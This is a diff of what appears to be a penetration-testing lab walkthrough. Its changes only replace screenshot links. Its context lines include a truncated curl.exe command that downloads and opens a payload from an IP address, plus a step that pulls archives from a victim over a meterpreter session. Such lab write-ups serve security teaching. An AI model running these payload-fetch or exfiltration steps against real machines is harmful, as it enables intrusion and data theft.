@@ -95,7 +95,7 @@ On Windows download the payload and open it: ```curl.exe http://192.169.92.136:8
 
 <img width="1140" height="462" alt="image" src="https://github.com/user-attachments/assets/44fe1b36-557d-4c8c-934e-8b6cc524076b" />
 
-<img width="476" height="224" alt="image" src="https://github.com/user-attachments/assets/f77b4e0c-a3f5-466a-9e4d-212c6ff79295" />
+<img width="412" height="185" alt="image" src="https://github.com/user-attachments/assets/4041ba57-32a3-47ea-beb2-705008289042" />
 
 Now from our kali machine, in the meterpreter session, download the archives.
 
@@ -103,4 +103,5 @@ Tip for troubleshooting: I had spawned a shell in my meterpreter instance to pro
 
 <img width="735" height="294" alt="image" src="https://github.com/user-attachments/assets/412449d3-472d-445c-8e27-cbfb97106bba" />
 
-<img width="424" height="82" alt="image" src="https://github.com/user-attachments/assets/b6220f0f-acdb-4a66-8260-038a980c3719" />
+<img width="476" height="224" alt="image" src="https://github.com/user-attachments/assets/ce7437d4-d190-48f0-b728-0ea97a54a7fc" />
+
